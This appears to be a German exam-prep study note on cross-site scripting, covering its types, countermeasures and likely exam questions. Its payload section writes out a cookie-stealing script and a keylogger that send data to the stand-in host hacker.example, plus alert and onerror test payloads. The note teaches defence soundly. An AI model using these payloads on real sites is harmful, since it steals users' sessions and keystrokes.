# XSS — Cross-Site Scripting

Cross-Site Scripting (XSS) ist ein Injection-Angriff, bei dem bösartiges JavaScript in eine Webanwendung eingeschleust wird, um von anderen Benutzern ausgeführt zu werden. Der Schadcode läuft im Browser des Opfers und kann Informationen stehlen, Inhalte manipulieren oder Aktionen im Namen des Benutzers ausführen.

## Voraussetzung

Die Webanwendung gibt Benutzereingaben ungefiltert in den HTML-Code aus. Der Browser interpretiert die Eingabe als JavaScript und führt sie aus.

## XSS-Typen

| Typ | Beschreibung | Persistence |
|-----|-------------|-------------|
| [Reflected XSS](05_xss_reflected.md) | Payload in der URL, wird sofort reflektiert | Nicht persistent |
| [Stored XSS](06_xss_stored.md) | Payload in der Datenbank gespeichert | Persistent |
| [DOM-Based XSS](07_xss_dom_based.md) | Payload manipuliert das DOM clientseitig | Nicht persistent |
| [Blind XSS](08_xss_blind.md) | Stored XSS, Effekt ist nur für Dritte (z. B. Admin) sichtbar | Persistent |

## Typische Payloads

### Alert (Proof of Concept)
```javascript
<script>alert('XSS');</script>
```

### Cookie stehlen und exfiltrieren
```javascript
<script>fetch('https://hacker.example/steal?cookie=' + btoa(document.cookie));</script>
```

### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
    fetch('https://hacker.example/log?key=' + btoa(e.key));
}
</script>
```

### Via HTML-Event-Handler (wenn `<script>` gefiltert wird)
```html
<img src=x onerror=alert(1)>
```

## Allgemeine Gegenmaßnahmen

- **Output Encoding (HTML Escaping)**: Sonderzeichen wie `<`, `>`, `"`, `'` durch HTML-Entities ersetzen, bevor Ausgabe in HTML eingebettet wird
- **`textContent` statt `innerHTML`**: Verhindert, dass Eingaben als HTML/JS interpretiert werden
- **DOMPurify**: Bibliothek zur sicheren Bereinigung von HTML
- **Content Security Policy (CSP)**: HTTP-Header, der festlegt, von welchen Quellen Skripte geladen werden dürfen
- **`HttpOnly`-Cookie**: JavaScript kann Session-Cookies nicht auslesen

## Prüfungs-Hotspots

- Was ist XSS und wie funktioniert es grundsätzlich?
- Welche vier Typen gibt es?
- Was kann ein Angreifer mit XSS machen? (Cookie-Diebstahl, Keylogging, Phishing)
- Warum hilft `HttpOnly` gegen XSS? (JavaScript kann das Cookie nicht lesen)
